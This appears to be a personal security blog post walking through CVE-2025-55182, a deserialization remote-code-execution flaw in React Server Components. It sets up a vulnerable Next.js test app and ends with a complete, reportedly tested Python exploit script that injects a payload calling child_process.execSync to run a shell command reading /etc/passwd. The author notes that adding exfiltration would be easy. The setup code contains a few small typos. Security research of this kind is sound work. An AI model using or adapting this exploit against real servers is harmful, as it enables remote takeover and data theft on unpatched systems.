
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/tokyo-night-dark.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
<script>hljs.highlightAll();</script>
<html xmlns="http://www.w3.org/1999/xhtml">
    <style>
        .post {
            margin-bottom: 40px;
            text-decoration: none;
            color: white;
            display: block;
            background-color: #111111;
            padding: 10px 30px;
        }
    </style>
    <head>
        <title>Exploring CVE-2025-55182</title>
        <meta charset="utf-8">
        <link rel="icon" type="image/x-icon" href="logo.png">
    </head>
    <body style="background-color: black;">
    
        <center>
            <pre style="color: white; margin: 60px auto 10px auto; width: 75%; font-size: 14px; font-family: 'Courier New', monospace;">
                <div>
     ██╗ ██████╗ ███████╗███████╗██████╗ ██╗  ██╗       ███████╗██╗   ██╗██████╗ ███╗   ██╗███████╗██████╗ 
     ██║██╔═══██╗██╔════╝██╔════╝██╔══██╗██║  ██║       ╚══███╔╝██║   ██║██╔══██╗████╗  ██║██╔════╝██╔══██╗
     ██║██║   ██║███████╗█████╗  ██████╔╝███████║         ███╔╝ ██║   ██║██████╔╝██╔██╗ ██║█████╗  ██████╔╝
██   ██║██║   ██║╚════██║██╔══╝  ██╔═══╝ ██╔══██║        ███╔╝  ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝███████║███████╗██║     ██║  ██║       ███████╗╚██████╔╝██║  ██║██║ ╚████║███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝       ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                </div>
            </pre>
            <pre style="color: white; margin: -50px auto 10px auto; width: 75%; font-size: 24px; font-family: 'Courier New', monospace;">
                <div>
<a href="../../index.html" style="color: white;">home</a> | <a href="../home.html" style="color: white;">blog</a>
                </div>
            </pre>
        </center>
        
        
        <footer>
        <div style="color: white; margin: 0px auto 100px auto; width: 60%; font-size: 20px; font-family: 'Courier New', monospace;"> 

            
            <!--
            Cyberchef recipe to convert notepad posts to HTML:
            [{"op":"Find / Replace","args":[{"option":"Regex","string":"\\t"},"&emsp;&emsp;",true,false,true,false]},{"op":"Find / Replace","args":[{"option":"Regex","string":"\\n\\n"},"<br><br>\\n\\n",true,false,true,false]}]
            
            
            To make subheadings:
                    <center>
                        <h3>This is a subheading</h3>
                    </center>
            yeah just throw that in the <p> tag, doesn't break anything
            
            -->
            
                <div class="post">
                    <center>
                        <h1>Exploring CVE-2025-55182</h1>
                    </center>
                    
                    
                    <p style="margin-bottom: 16px; line-height: 1.4;">
                    
                    
CVE-2025-55182 is a recent vulnerability in React Server Components. Rated at a CVSS 10.0, exploits take advantage of an unsafe deserialization weakness to run code remotely. Exploitation has been observed in the wild for some time, starting just a few hours after the first PoC was released, and there is a large number of exposed instances that may be vulnerable.

<br>

<center>
    <h3>Background - React Chunks</h3>
</center>

A chunk is a piece of data sent from a server (to a client or another server) that represents a small part of a larger response. This has a variety of uses; for instance, if a server generates data slowly, it may be possible to send those pieces in chunks so that the client can use some parts before everything is ready. React uses a custom protocol to send data in the form of chunks.

In this example, chunk 0 references data in chunk 1:
<pre><code class="language-json">
// chunk 0
{
    "fname": "John",
    "lname": "$1"
}

// chunk 1
{
    "name": "Doe"
}
</code></pre>
<br>

Notably, React's protocol also allows for embedding references that control how React constructs data. If the input isn't cleaned correctly, this could lead to code execution. In the above example, suppose you had something like this in chunk 0 instead:

<pre><code class="language-json">
"lname": "$1:__proto__:constructor:constructor"
</code></pre>
<br>

Every ordinary JavaScript object has internal parents called prototypes, accessible with __proto__. From there, the prototype's constructor can be retrieved, and then that constructor's constructor can be retrieved, which is Function:

<pre><code class="language-javascript">
Object.prototype.constructor === Object
Object.prototype.constructor.constructor === Function
</code></pre>
<br>

If you have the ability to pass in a custom chunk and the input isn't processed well enough, arbitrary code can be run using Function.

<center>
    <h3>Environment Setup</h3>
</center>

To recreate the vulnerability, I first set up a simple React app. The following works on an Ubuntu machine, and may require changes to work on other versions or operating systems.
<pre><code class="language-javascript">
File structure

my-app/
|- package.json
|- next.config.js
|- jsconfig.json
|- app/
|   |- Counter.jsx
|   |- layout.js
|    - page.js
 - public/
    - favicon.ico
</code></pre>

package.json
<pre><code class="language-json">
{
    "name": "my-app",
    "version": "1.0.0",
    "private": true,
    "scripts": {
        "dev": "next dev",
        "build": "next build",
        "start": "next start"
    },
    "dependencies": {
        "next": "15.5.0",
        "react": "19.2.0",
        "react-dom": "19.2.0",
        "react-server-dom-webpack": "19.2.0"
    },
    "engines": {
        "node": ">=20.9.0"
    }
}
</code></pre>

next.config.js
<pre><code class="language-javascript">
/** @type {import('next').NextConfig} */
const nextConfig = {
    reactStrictMode: true,
    experimental: {}
};

module.exports = nextConfig;
</code></pre>

jsconfig.json
<pre class="language-json"><code>
{
    "compilerOptions": {
        "baseUrl": ".",
        "paths": {
            "@/*": ["./*"]
        }
    }
}
</code></pre>

Counter.jsx:
<pre class="language-jsx"><code>
"use client";

import {useState} from "react";

export default function Counter() {
    const [count, setCount] = useState();
    return (
        &lt;section&gt;
            &lt;h2&gt;Counter&lt;/h2&gt;
            &lt;button type="button" onClick={() =&gt; setCount((c) =? c + 1)}&gt;
			Count: {count}
            &lt;/button&gt;
        &lt;/section&gt;
    )
}
</code></pre>

layout.js:
<pre class="language-javascript"><code>
export const metadata = {
    title: "Testing app",
    description: "Testing app"
};

export default function RootLayout({children}) {
    return (
        &lt;html len="en"&gt;
            &lt;body&gt;{children}&lt;/body&gt;
        &lt;/html&gt;
    );
}
</code></pre>

page.js:
<pre><code class="language-javascript">
import Counter from "./Counter"

export default function Home() {
    const serverRenderedTime = new Date().toISOString():
    
    return (
        &lt;main&gt;
            &lt;h1&gt;hello&lt;/h1&gt;
            &lt;p&gt;
                Rendered at:&lt;br /&gt;
                &lt;code&gt;{serverRenderedTime}&lt;/code&gt;
            &lt;/p&gt;
        &lt;/main&gt;
    );
}
</code></pre>

<center>
    <h3>Scripting an exploit</h3>
</center>

With a working environment, it wasn't too difficult to write a working script based on maple3142's initial PoC, <a href="https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3">available on GitHub</a>. Note that the below script just opens a new terminal displaying /etc/passwd - it doesn't provide any exfiltration or callback utility, which shouldn't be too hard to add.
<br><br>
This exploit is tested and working on React Server Components version 19.2.0, hosted on Ubuntu 25.10.

<pre><code class="language-python">
import http.client

target = "localhost:3000"
boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
command = 'gnome-terminal -- bash -c \\"cat /etc/passwd; exec bash\\"'

body_parts = []
body_parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n")

payload = """
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('""" + command + """');","_formData":{"get":"$1:constructor:constructor"}}}
"""

body_parts.append(f"{payload}\r\n")
body_parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--{boundary}--\r\n")

body = "".join(body_parts)

headers = {
	"Host": target,
	"User-Agent": "real user agent",
	"Next-Action": "x",
	"Content-Type": f"multipart/form-data; boundary={boundary}",
	"Content-Length": str(len(body.encode("utf-8")))
}

conn = http.client.HTTPConnection(target)
conn.request("POST", "/", body=body, headers=headers)

resp = conn.getresponse()
print(resp.status, resp.reason)
print(resp.read().decode())
conn.close()
</code></pre>





</p>
                </div>
            
            
        </div>
        </footer>
    </body>
    
    <!-- some landing page content from x86re.com -->
</html>
